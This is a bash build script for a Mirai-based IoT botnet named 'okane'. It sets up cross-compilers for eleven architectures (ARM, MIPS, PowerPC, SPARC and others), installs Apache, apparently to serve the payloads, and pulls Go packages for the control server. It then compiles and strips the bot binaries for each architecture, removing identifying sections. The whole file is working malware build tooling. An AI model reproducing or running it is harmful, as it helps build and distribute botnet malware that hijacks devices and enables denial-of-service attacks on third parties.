#!/bin/bash
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin

yum install httpd -y
apt-get install apache2 -y


export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords

function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}



compile_bot i586 okane.x86 "-static -w -Dx86"
compile_bot mips okane.mips "-static -w -Dmips"
compile_bot mipsel okane.mpsl "-static -w -Dmpsl"
compile_bot armv4l okane.arm "-static -w -Darm"
compile_bot armv5l okane.arm5 "-static -w -Darm5"
compile_bot armv6l okane.arm6 "-static -w -Darm6"
compile_bot armv7l okane.arm7 "-static -w -Darm7"
compile_bot powerpc okane.ppc "-static -w -Dppc"
compile_bot sparc okane.sparc "-static -w -Dsparc"
compile_bot m68k okane.m68k "-static -w -Dm68k"
compile_bot sh4 okane.sh4 "-static -w -Dsh4"

